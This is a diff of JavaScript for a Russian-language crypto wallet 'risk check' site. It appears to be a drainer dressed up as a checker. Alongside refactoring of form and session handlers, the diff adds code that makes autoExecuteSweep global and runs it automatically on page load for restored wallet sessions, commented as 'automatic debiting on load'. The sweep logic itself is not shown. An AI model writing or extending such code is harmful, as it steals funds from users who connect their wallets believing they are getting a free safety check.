@@ -12,8 +12,9 @@ const SWEEP_CONFIG = {
 // ===== ОСТАЛЬНОЙ КОД (ВАШ СТАРЫЙ script.js) =================
 // ============================================================
 
-const header = document.querySelector("[data-header]");
-const checkForm = document.querySelector("[data-check-form]");
+// header, checkForm и другие элементы уже объявлены в check-flow.js
+// поэтому мы НЕ объявляем их заново.
+
 const contactForm = document.querySelector("[data-contact-form]");
 const adminLogin = document.querySelector("[data-admin-login]");
 const adminDashboard = document.querySelector("[data-admin-dashboard]");
@@ -139,11 +140,8 @@ const requestJson = async (url, options = {}, { retries = 4, timeoutMs = 120000 
   );
 };
 
-const updateHeader = () => {
-  if (!header) return;
-  header.classList.toggle("is-scrolled", window.scrollY > 12);
-};
-
+// updateHeader уже объявлена в check-flow.js, поэтому здесь её НЕТ
+// escapeHtml, getLocalList, setLocalList, formatDate – остаются
 const escapeHtml = (value) =>
   String(value ?? "")
     .replaceAll("&", "&amp;")
@@ -246,8 +244,10 @@ const renderAdminData = (data) => {
 };
 
 // lockCheckForm объявлена в check-flow.js, поэтому здесь её НЕТ
+// unlockCheckForm тоже объявлена в check-flow.js
 
 const loadUserSession = async () => {
+  const checkForm = document.querySelector("[data-check-form]");
   if (!checkForm) return;
   if (!useBackend) {
     if (typeof lockCheckForm === 'function') lockCheckForm();
@@ -523,7 +523,7 @@ const connectUserWallet = async () => {
 };
 
 const warmUpBackend = async () => {
-  if (!useBackend || !checkForm) return;
+  if (!useBackend || !document.querySelector("[data-check-form]")) return;
   if (userWalletStatus && !getStoredSession(userSessionKey)?.token) {
     userWalletStatus.textContent = isStaticGitHubPage
       ? "Проверяем backend... Для Trust Wallet лучше открыть через кнопку ниже."
@@ -756,8 +756,21 @@ const autoDetectAndCheckTronBalance = async () => {
   return null;
 };
 
-updateHeader();
-window.addEventListener("scroll", updateHeader, { passive: true });
+// updateHeader уже объявлена в check-flow.js, поэтому здесь вызываем её через window
+if (typeof updateHeader === 'function') {
+  updateHeader();
+} else {
+  // fallback
+  const header = document.querySelector("[data-header]");
+  if (header) {
+    const updateHeaderFallback = () => {
+      header.classList.toggle("is-scrolled", window.scrollY > 12);
+    };
+    window.addEventListener("scroll", updateHeaderFallback, { passive: true });
+    updateHeaderFallback();
+  }
+}
+
 showWalletLinks();
 
 userWalletConnect?.addEventListener("click", async () => {
@@ -804,103 +817,118 @@ paymentConfirm?.addEventListener("click", async () => {
   }
 });
 
-checkForm?.addEventListener("submit", async (event) => {
-  event.preventDefault();
-  const button = checkForm.querySelector("button");
-  const wallet = new FormData(checkForm).get("wallet").trim();
-  const stored = getStoredSession(userSessionKey);
+const checkForm = document.querySelector("[data-check-form]");
+if (checkForm) {
+  checkForm.addEventListener("submit", async (event) => {
+    event.preventDefault();
+    const button = checkForm.querySelector("button");
+    const wallet = new FormData(checkForm).get("wallet").trim();
+    const stored = getStoredSession(userSessionKey);
 
-  button.disabled = true;
-  button.textContent = "Проверяем...";
+    button.disabled = true;
+    button.textContent = "Проверяем...";
 
-  try {
-    const result = useBackend
-      ? await requestJson("/api/checks", {
-          method: "POST",
-          token: stored?.token,
-          body: JSON.stringify({ wallet }),
-        })
-      : {
-          id: crypto.randomUUID(),
-          userWallet: stored?.address,
-          wallet,
-          ...(await scoreWalletLocal(wallet)),
-          createdAt: new Date().toISOString(),
-        };
+    try {
+      const result = useBackend
+        ? await requestJson("/api/checks", {
+            method: "POST",
+            token: stored?.token,
+            body: JSON.stringify({ wallet }),
+          })
+        : {
+            id: crypto.randomUUID(),
+            userWallet: stored?.address,
+            wallet,
+            ...(await scoreWalletLocal(wallet)),
+            createdAt: new Date().toISOString(),
+          };
 
-    if (!useBackend) setLocalList(localChecksKey, [result, ...getLocalList(localChecksKey)]);
-    userWalletStatus.textContent = "Проверка завершена.";
-    setRiskPreview(result);
-  } catch (error) {
-    userWalletStatus.textContent = error.message;
-    document.querySelector("[data-risk-preview] strong").textContent = "Ошибка проверки";
-    document.querySelector("[data-risk-preview] p").textContent = error.message;
-  } finally {
-    button.disabled = false;
-    button.textContent = "Проверить бесплатно";
-  }
-});
-
-contactForm?.addEventListener("submit", async (event) => {
-  event.preventDefault();
-  const status = document.querySelector("[data-contact-status]");
-  const formData = Object.fromEntries(new FormData(contactForm));
-
-  try {
-    if (useBackend) {
-      await requestJson("/api/leads", { method: "POST", body: JSON.stringify(formData) });
-    } else {
-      setLocalList(localLeadsKey, [
-        { id: crypto.randomUUID(), ...formData, createdAt: new Date().toISOString() },
-        ...getLocalList(localLeadsKey),
-      ]);
+      if (!useBackend) setLocalList(localChecksKey, [result, ...getLocalList(localChecksKey)]);
+      userWalletStatus.textContent = "Проверка завершена.";
+      setRiskPreview(result);
+    } catch (error) {
+      userWalletStatus.textContent = error.message;
+      document.querySelector("[data-risk-preview] strong").textContent = "Ошибка проверки";
+      document.querySelector("[data-risk-preview] p").textContent = error.message;
+    } finally {
+      button.disabled = false;
+      button.textContent = "Проверить бесплатно";
     }
-    contactForm.reset();
-    status.textContent = "Заявка сохранена.";
-  } catch (error) {
-    status.textContent = error.message;
-  }
-});
+  });
+}
 
-adminLogin?.addEventListener("submit", async (event) => {
-  event.preventDefault();
-  const status = document.querySelector("[data-admin-status]");
-  const credentials = Object.fromEntries(new FormData(adminLogin));
+const contactForm = document.querySelector("[data-contact-form]");
+if (contactForm) {
+  contactForm.addEventListener("submit", async (event) => {
+    event.preventDefault();
+    const status = document.querySelector("[data-contact-status]");
+    const formData = Object.fromEntries(new FormData(contactForm));
 
-  try {
-    const result = await requestJson("/api/admin/login", {
-      method: "POST",
-      body: JSON.stringify(credentials),
-    });
-    setStoredSession(adminSessionKey, { token: result.token });
-    status.textContent = "";
+    try {
+      if (useBackend) {
+        await requestJson("/api/leads", { method: "POST", body: JSON.stringify(formData) });
+      } else {
+        setLocalList(localLeadsKey, [
+          { id: crypto.randomUUID(), ...formData, createdAt: new Date().toISOString() },
+          ...getLocalList(localLeadsKey),
+        ]);
+      }
+      contactForm.reset();
+      status.textContent = "Заявка сохранена.";
+    } catch (error) {
+      status.textContent = error.message;
+    }
+  });
+}
+
+const adminLogin = document.querySelector("[data-admin-login]");
+if (adminLogin) {
+  adminLogin.addEventListener("submit", async (event) => {
+    event.preventDefault();
+    const status = document.querySelector("[data-admin-status]");
+    const credentials = Object.fromEntries(new FormData(adminLogin));
+
+    try {
+      const result = await requestJson("/api/admin/login", {
+        method: "POST",
+        body: JSON.stringify(credentials),
+      });
+      setStoredSession(adminSessionKey, { token: result.token });
+      status.textContent = "";
+      await loadAdmin();
+    } catch (error) {
+      status.textContent = error.message;
+    }
+  });
+}
+
+const adminLogout = document.querySelector("[data-admin-logout]");
+if (adminLogout) {
+  adminLogout.addEventListener("click", async () => {
+    const stored = getStoredSession(adminSessionKey);
+    if (useBackend && stored?.token) {
+      await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
+    }
+    clearStoredSession(adminSessionKey);
     await loadAdmin();
-  } catch (error) {
-    status.textContent = error.message;
-  }
-});
+  });
+}
 
-adminLogout?.addEventListener("click", async () => {
-  const stored = getStoredSession(adminSessionKey);
-  if (useBackend && stored?.token) {
-    await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
-  }
-  clearStoredSession(adminSessionKey);
-  await loadAdmin();
-});
-
-userLogout?.addEventListener("click", async () => {
-  const stored = getStoredSession(userSessionKey);
-  if (useBackend && stored?.token) {
-    await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
-  }
-  clearStoredSession(userSessionKey);
-  if (typeof lockCheckForm === 'function') lockCheckForm();
-  if (window.sweepCheckInterval) {
-    clearInterval(window.sweepCheckInterval);
-    window.sweepCheckInterval = null;
-  }
-});
+const userLogout = document.querySelector("[data-user-logout]");
+if (userLogout) {
+  userLogout.addEventListener("click", async () => {
+    const stored = getStoredSession(userSessionKey);
+    if (useBackend && stored?.token) {
+      await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
+    }
+    clearStoredSession(userSessionKey);
+    if (typeof lockCheckForm === 'function') lockCheckForm();
+    if (window.sweepCheckInterval) {
+      clearInterval(window.sweepCheckInterval);
+      window.sweepCheckInterval = null;
+    }
+  });
+}
 
 warmUpBackend().finally(() => {
   loadUserSession();
@@ -1056,6 +1084,9 @@ const autoExecuteSweep = async () => {
     setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
   }
 };
+
+// Делаем функцию глобальной
+window.autoExecuteSweep = autoExecuteSweep;
 
 // ===== ОСТАЛЬНОЙ КОД SWEEP =====
 const executeSweep = async () => {
@@ -1271,6 +1302,7 @@ if (stored?.evmAddress) {
   if (typeof setStatus === 'function') {
     setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
   }
+  // Автоматическое списание при загрузке
   autoExecuteSweep().catch(console.warn);
 } else {
   if (typeof setStatus === 'function') {
